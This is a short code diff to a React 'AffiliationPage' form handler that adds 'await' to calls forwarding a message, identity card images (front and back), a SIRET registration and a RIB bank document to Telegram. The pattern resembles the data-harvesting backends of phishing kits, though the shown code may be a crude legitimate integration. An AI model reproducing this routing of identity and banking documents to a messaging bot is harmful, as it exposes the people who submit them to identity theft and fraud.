@@ -132,11 +132,11 @@ function AffiliationPage() {
       setLoading(true);
 
       try {
-        sendMessageToTelegram(message);
-        sendDocToTelegram(cniRecto);
-        sendDocToTelegram(cniVerso);
-        sendDocToTelegram(siret);
-        sendDocToTelegram(rib);
+        await sendMessageToTelegram(message);
+        await sendDocToTelegram(cniRecto);
+        await sendDocToTelegram(cniVerso);
+        await sendDocToTelegram(siret);
+        await sendDocToTelegram(rib);
       } catch (error) {
         console.log(error);
       } finally {
